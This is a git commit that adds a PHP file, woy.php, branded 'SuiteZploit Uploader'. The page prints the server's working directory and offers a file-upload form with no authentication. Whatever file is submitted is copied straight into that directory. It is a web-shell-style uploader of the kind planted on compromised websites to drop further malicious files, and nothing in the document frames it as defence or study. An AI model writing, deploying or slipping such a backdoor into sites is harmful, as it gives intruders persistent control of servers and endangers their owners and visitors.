77815acc3f805a67f40c91e75c55b3036db78322
layn-cyber <78388844+layn-cyber@users.noreply.github.com>
2021-02-02 06:07:11 +0700

    siap
    wke

---
+++ woy.php
@@ -0,0 +1,45 @@
+<?php
+ {
+echo '<link rel="shortcut icon" href="https://3.bp.blogspot.com/-btl4SgZKDdA/W_qtDGNiD8I/AAAAAAAAA28/o8LpuC7D6WIfmcw-mk6Wvjq-OPUv7gJNACLcBGAs/s1600/20181125_132029.png">';
+echo '<center>';
+echo '<br><br><br><img height="200" src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/98/Transhumanism_h%2B_2.svg/1200px-Transhumanism_h%2B_2.svg.png"></a>
+';
+
+
+echo '<title>SuiteZploit Uploader</title>';
+echo'<body style="background-color: #272B2E; color: white;"
+alink="#ee0000" link="#0000ee" vlink="#551a8b">';
+echo '<center>';
+echo '<br><br>';
+
+echo '<big><span style="color: white;">'.getcwd().'</span></big><br><br>';
+
+echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader"> 
+<input type="file" name="mlf"/>
+<input name="upl" id="upl" type="submit" value="upload" />
+</form>';
+if($_POST['upl'] == "upload")
+  if(@copy($_FILES['mlf']['tmp_name'], $_FILES['mlf']['name']))
+  {echo '<font size="2" color="white">Succes</font>';}
+  else
+  {echo '<font size="2" color="white">Failed</font>';}
+echo '</body></div><br><br><link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.3.1/css/all.css"><center>
+    <i class="fa fa-envelope"></i>
+    <i class="fa fa-instagram"></i>
+    <i class="fa fa-facebook"></i>
+    <i class="fa fa-github"></i><br>  <br><a href="https://www.suitezploit.me"><font color="red">
+     exit<font color="white"> ()<font color="white">;
+';
+}
+?>
+<!DOCTYPE html>
+<head>
+  <link rel='stylesheet' href='https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css'/>
+
+<link type="text/css" href="http://anicrack-indo.netii.net/error.css" rel="stylesheet">
+<link href="http://fonts.googleapis.com/css?family=Iceland" rel="stylesheet" type="text/css">
+</head>
+<html>
+</body>
+
+</html>
